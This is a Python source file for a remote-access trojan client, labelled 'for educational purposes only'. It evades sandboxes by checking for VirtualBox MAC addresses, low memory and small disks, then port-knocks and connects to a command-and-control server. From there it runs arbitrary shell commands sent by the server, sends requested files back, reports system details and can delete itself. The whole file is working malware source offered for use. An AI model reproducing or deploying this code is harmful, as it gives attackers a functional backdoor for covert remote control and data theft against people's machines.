#!/usr/bin/env python

__author__   = "rekcah"
__email__    = "rekcah@keabyte.com"
__desc__     = "For educational purposes only ;)"

import socket, _thread, os, sys, platform, subprocess, psutil, string, secrets, time

from core import Knocker
from subprocess import Popen
from sys import argv
from random import randint
from struct import *

#############################################
os.system('')

BUFFER = 4096
ENCODING = "utf-8"

host = '127.0.0.1'
port = 5010
sockt = socket.socket()
# sockt.setblocking(True)

GIGABYTE = 1073742000
PARANOID = False    # Sets the evasion techniques used

# "Knockable" Ports (they're not reserved though)
portSet = [5010, 5011, 5012, 5013, 5014, 5015, 5016, 5017, 5018, 5019, 5020]

############################################

xor_key = 9852

decoy_string1 = "72.87.16.152:2257"
decoy_string2 = "216.58.204.142"
decoy_string3 = "IP:193.84.11.15|PORT:443"
decoy_string4 = "P@$$w0rD#3nC0d3D"


############################################


def evadeSandbox():
    global PARANOID, GIGABYTE

    # Fetch system informations

    # Starting by memory
    memory = psutil.virtual_memory()

    # Get the current disk usage
    disk = psutil.disk_usage(os.path.dirname(os.path.abspath(__file__)))    # get the current disk usage

    # Get network interfaces
    network = psutil.net_if_stats()

    # It doesn't matter how paranoid you are, you just can't ignore this
    if "08:00:27" in str(network):
        # A virtualbox mac adress prefix
        # lol they're trying to sandbox us, let's giv'em a decoy
        decoyActivity(True)

    if PARANOID :
        print("paranoid mode")
        # Remember, we're completely paranoid here...
        if memory[0] <= GIGABYTE :
            # the OS has less than 1GB of RAM, Maybe a sofisticated sandbox
            # In paranoid mode we run a decoy activity
            decoyActivity(True)
        elif disk[0] <= (25 * GIGABYTE) :
            # The system has less than 25 GB of Disk on the current partition.
            # In paranoid mode we assume modern systems have more than that so let's run a decoy
            decoyActivity(True)
        elif 0 < disk[3] < 25 :
            # The curent disk has a usage between 0 and 25 percents maybe a new os ?
            # We're paranoid here so let's set a decoy
            decoyActivity(True)
    else :
        print("not paranoid")
        # We're less paranoid so let's change the variables
        if memory[0] <= (GIGABYTE/2):
            # the OS has less than 512MB of RAM
            print("memory not paranoid")
            decoyActivity(True)
        elif disk[0] <= (15 * GIGABYTE):
            # The system has less than 15 GB of Disk on the current partition
            print("disk not paranoid")
            decoyActivity(True)
        elif 1 < disk[3] < 2 :
            # The curent disk has a usage between 1 and 5 percents maybe a new linux OS with reserved 5% ?
            print("usage not paranoid")
            decoyActivity(True)

    # Delay the system execution runing a decoy
    decoyActivity(False)


def decoyActivity(quitWhenDone = True, delay = randint(1, 5)):
    # The decoy activity consists mailny in running multiple random generator
    # To lure memory analysis in the sandbox
    data = []
    if quitWhenDone :
        while delay > 0:
            time.sleep(1)
            data.append("".join(
                secrets.choice(string.ascii_letters + string.digits + string.punctuation + string.hexdigits) for _ in
                range(randint(2, 20))))
            delay -= 1
        # Excit the program as if nothing happened
        sys.exit(0)
    else :  # We don't quit the program so the rest of the code can be executed
        while delay > 0:
            time.sleep(1)
            data.append("".join(
                secrets.choice(string.ascii_letters + string.digits + string.punctuation + string.hexdigits) for _ in
                range(randint(2, 20))))
            delay -= 1

def knockToHeavensDoor():
    global host, portSet, port
    knocker = Knocker.Knocker(host, portSet[randint(0, len(portSet) - 1)])
    # Send knocking package
    knocker.knock()
    port = knocker.getRealPort()


def getMessages():
    global  sockt, BUFFER, ENCODING

    while True:
        raw = sockt.recv(BUFFER)

        data = raw.decode()
        # print("--->>> Received data : %s <<<----" % data)
        # here is the place to decrypt the received data
        # maybe the xor function here

        # we've got the data now the fun begins : parsing :P
        if data.upper() == "KILL":
            # Kill the process
            sockt.send("Kiling the snitch... Bye!".encode(ENCODING))
            sockt.close()
            sys.exit(0)
        elif data.upper() == "REMOVE":
            # remove the executable
            os.remove(argv[0])
            # exit the program
            sockt.send("Removing the snitch... Bye!".encode(ENCODING))
            sockt.close()
            sys.exit(0)
        elif data.upper() == "GETINFO":
            # collect informations
            info = {"architecture": platform.machine(), "system": platform.system(), "uname": platform.uname(),
                    "release": platform.release(),
                    "sys_ver": platform.version()}
            # send them back to the C&C
            sockt.send(str(info).encode(ENCODING))

            print(">>>>>>>>>> %s <<<<<<<<<<" % str(info))

        else :
            if "SHELL" in data.upper() :
                sub = data.split(" ")
                if len(sub) >= 1 :
                    #possibly well formed shell command. Let's execute it
                    print("running command : [%s]" % data[6:])
                    op = Popen([data[6:]], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                    if op:
                        output = str(op.stdout.read())
                        sockt.send(bytes(output, ENCODING))
                        print("[%s] ---> [%s]" % (data, str(output)))
                    else:
                        error = str(op.stderr.read())
                        sockt.send(bytes(error, ENCODING))
                        print("[%s] ---> [%s]" % (data, str(error)))
            if "GETFILE" in data.upper() :
                print("GETFLIE ---> %s" % data)
                args = data.split(" ")
                if 0 < len(args) == 2 :
                    if os.path.isfile(args[1]):
                        print("C&C Requesting file '%s' " % args[1])
                        # File exists we can send it
                        with open(args[1], "rb") as file:
                            buff = file.read(BUFFER)
                            sockt.send("!FILE!".encode(ENCODING))
                            time.sleep(2)
                            # start sending the file
                            while buff :
                                print("sending buffer -> %s" % str(buff))
                                sockt.send(buff)
                                buff = file.read(BUFFER)
                        sockt.send("!ENDFILE!".encode(ENCODING))
                    else:
                        print("C&C Requesting file '%s' does not exists" % args[1])
                        sockt.send("REQUESTED FILE DOES NOT EXISTS".encode("utf-8"))

    # _thread.start_new_thread(getMessages, ())

def sendMessage():
    global sockt
    while True:
        msg = input()
        sockt.send(msg.encode('utf-8'))

def addIpTableRule():
    #add this rule : "iptables -I INPUT -p tcp --dport 5110 -j LOG"

    subprocess.Popen(['iptables', "-I", "INPUT", "-p"])

def main():
    global  sockt, host, port, xor_key, decoy_string1, decoy_string2, decoy_string3, decoy_string4

    # Call the sandbox evasion
    evadeSandbox()
    print("Sandbox successfully evaded... I Guess? ")
    #Call the knocker here
    knockToHeavensDoor()
    #wait before connecting
    time.sleep(5)
    #try to connect
    try:
        print("Connecting to [%s,%d]" % (host, port))
        sockt.connect((host, port))
    except ConnectionRefusedError as e :
        print("Error... %s" + str(e))

    _thread.start_new_thread(getMessages, ())
    _thread.start_new_thread(sendMessage, ())

    while True:
        pass

if __name__ == "__main__":
    main()
